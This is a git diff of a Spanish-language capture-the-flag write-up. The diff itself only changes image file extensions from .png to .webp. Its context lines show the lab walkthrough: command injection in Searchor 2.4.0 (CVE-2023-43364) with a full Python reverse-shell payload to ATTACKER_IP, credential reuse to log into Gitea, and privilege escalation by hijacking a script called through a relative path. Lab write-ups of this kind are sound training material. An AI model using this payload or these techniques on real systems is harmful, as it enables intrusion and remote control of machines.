@@ -4,7 +4,7 @@ Propiedades:
 - Nivel: Easy
 - Tags: #command-injection #credential-reutilization #CVE-2023-43364 #
 
-![](assets/Pasted%20image%2020251217152713.png)
+![](assets/Pasted%20image%2020251217152713.webp)
 ## Reconocimiento
 
 Comienzo tirando un ping para comprobar la conectividad.
@@ -72,12 +72,12 @@ Colocamos el dominio en el **/etc/hosts**
 
 - Al parecer la pagina es como un buscador universal
 
-![](assets/Pasted%20image%2020251217153458.png)
+![](assets/Pasted%20image%2020251217153458.webp)
 
 - Hay distintas fuente/motores de búsqueda
 - Podemos ver que utiliza Flask y Searchor 2.4.0
 
-![](assets/Pasted%20image%2020251217153550.png)
+![](assets/Pasted%20image%2020251217153550.webp)
 
 
 ## Explotación
@@ -117,7 +117,7 @@ Y vamos a colocar nuestro payload en la parte de búsqueda:
 ', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
 ```
 
-![](assets/Pasted%20image%2020251217155938.png)
+![](assets/Pasted%20image%2020251217155938.webp)
 
 Recibimos la conexión.
 
@@ -177,13 +177,13 @@ Metimos el subdominio al `/etc/hosts`
 
 **Gitea** es un software para el control de versiones auto alojado
 
-![](assets/Pasted%20image%2020251217162929.png)
+![](assets/Pasted%20image%2020251217162929.webp)
 
 
 
 Con las credenciales anteriormente encontradas podemos tratar de logearnos.
 
-![](assets/Pasted%20image%2020251217163016.png)
+![](assets/Pasted%20image%2020251217163016.webp)
 
 Dentro del **Gitea** solo encontramos un usuario **administrator**  y un **repositorio**.
 
@@ -245,7 +245,7 @@ Dentro del gitea me encontré con esta parte del script `system-checkup.py`.
 
 - Esta ejecutando `./full-checkup.sh` sin ruta absoluta.
 
-![](assets/Pasted%20image%2020251217165619.png)
+![](assets/Pasted%20image%2020251217165619.webp)
 
 Vamos a crear un script malicioso con el mismo nombre `full-checkup.sh` que se va a ejecutar cuando ejecutemos el script principal `system-checkup.py`.
 
@@ -288,4 +288,4 @@ wndr-5.1#
 
 ***PWNED***
 
-![](assets/Pasted%20image%2020251217170702.png)
+![](assets/Pasted%20image%2020251217170702.webp)
